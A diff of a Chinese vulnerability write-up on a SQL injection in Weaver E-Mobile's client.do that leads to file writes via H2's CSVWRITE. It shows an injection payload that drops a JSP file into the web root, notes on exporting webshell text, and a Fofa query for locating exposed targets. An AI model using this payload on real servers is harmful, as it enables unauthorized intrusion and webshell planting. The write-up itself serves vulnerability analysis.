@@ -7,13 +7,13 @@ source: "gelusus/wxvl 公众号漏洞文库"
   
 # 漏洞分析  
   
-可以知道 出现漏洞的地方是在   
+可以知道 出现漏洞的地方是在   
 client.do  
- 这个页面  
+ 这个页面  
   
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/umfmicibSEUbg2vxCo283L8TwdAmCqwhebELZCddVbZZ5WibYYu59eLeOtsg7R31operPxPibQNKS4E8opTrx96xvw/640?wx_fmt=png&from=appmsg "")  
   
-由于泛微用的是spring框架，这里的   
+由于泛微用的是spring框架，这里的   
 *  
 .do 都会指向 emobile-servlet.xml  
   
@@ -73,7 +73,7 @@ NAME的标识
 用这样的方法是可以原版导出webshell文本的,这样就不用避免双引号的问题了  
   
 **call**  
- CSVWRITE('E:/webapps/cx12.jsp','select AUTH  
+ CSVWRITE('E:/webapps/cx12.jsp','select AUTH  
 _  
 VALUE  
 _  
@@ -81,7 +81,7 @@ NAME FROM MOBILE
 _  
 USER  
 _  
-AUTH where id=1011','charset=UTF-8 escape=  fieldDelimiter=  writeColumnHeader=false  ')  
+AUTH where id=1011','charset=UTF-8 escape=  fieldDelimiter=  writeColumnHeader=false  ')  
   
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/umfmicibSEUbg2vxCo283L8TwdAmCqwhebcTocNNq61qGN2iaWeRFSndNEwoxPrrDAuFwsn1nNCRMBKz2f0vJmXTA/640?wx_fmt=png&from=appmsg "")  
 ## 漏洞复现步骤  
@@ -124,7 +124,7 @@ Fofa语法：app="泛微-EMobile" && title!="移动管理平台-企业管理"
   
 SQL语句中单引号是转义符  
   
-3';call CSVWRITE('./webapps/ROOT/weixin/nix.jsp','select HEXTORAW(''003c002500200020006f00750074002e007000720069006e00740028002200360036003600360036003600360036003600220029003b00200025003e'')','charset=UTF-8 escape=  fieldDelimiter=  writeColumnHeader=false  ')--  
+3';call CSVWRITE('./webapps/ROOT/weixin/nix.jsp','select HEXTORAW(''003c002500200020006f00750074002e007000720069006e00740028002200360036003600360036003600360036003600220029003b00200025003e'')','charset=UTF-8 escape=  fieldDelimiter=  writeColumnHeader=false  ')--  
   
 以下是发送的数据包  
 ```
